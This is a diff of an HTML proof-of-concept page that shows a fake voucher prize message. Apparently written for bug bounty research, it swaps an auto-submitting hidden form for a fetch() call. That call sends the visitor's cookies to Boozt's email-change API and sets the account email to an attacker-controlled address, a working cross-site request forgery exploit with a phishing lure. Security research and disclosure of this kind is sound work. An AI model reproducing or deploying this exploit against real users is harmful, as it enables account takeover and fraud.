@@ -9,15 +9,20 @@
     <h1>Congratulations!</h1>
     <p>You have won a €50 Boozt voucher. Click the button below to claim it instantly.</p>
 
-    <form id="exploit-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
-        enctype="text/plain">
-        <input type="hidden" name='{"email":"attacker+extratest2@wearehackerone.com"}' value=''>
-        <input type="submit" value="Claim Voucher">
-    </form>
-
     <script>
-        // Auto-submit the form
-        document.getElementById('exploit-form').submit();
+        // Send the exact payload that worked in Burp
+        fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'text/plain',
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            credentials: 'include', // Include cookies
+            body: '{"email":"attacker+extratest3@wearehackerone.com"}'
+        })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
     </script>
 </body>
 
